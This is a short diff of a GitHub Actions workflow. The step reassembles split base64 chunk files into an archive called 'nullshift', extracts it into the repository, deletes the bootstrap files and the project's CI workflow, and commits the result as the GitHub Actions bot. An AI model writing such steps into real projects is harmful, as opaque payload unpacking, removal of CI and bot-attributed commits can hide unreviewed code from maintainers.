@@ -19,7 +19,8 @@ jobs:
           cat .bootstrap/c01 .bootstrap/c02x .bootstrap/c03 .bootstrap/c04 .bootstrap/c05 .bootstrap/c06 .bootstrap/c07 .bootstrap/c08 .bootstrap/c09 > /tmp/nullshift.b64
           base64 -d /tmp/nullshift.b64 > /tmp/nullshift.tar.gz
           tar -xzf /tmp/nullshift.tar.gz -C .
-          rm -rf .bootstrap .bundle .bootstrap-marker .github/workflows/bootstrap.yml
+          rm -rf .bootstrap .bundle .bootstrap-marker
+          rm -f .github/workflows/ci.yml
           git config user.name "github-actions[bot]"
           git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
           git add -A
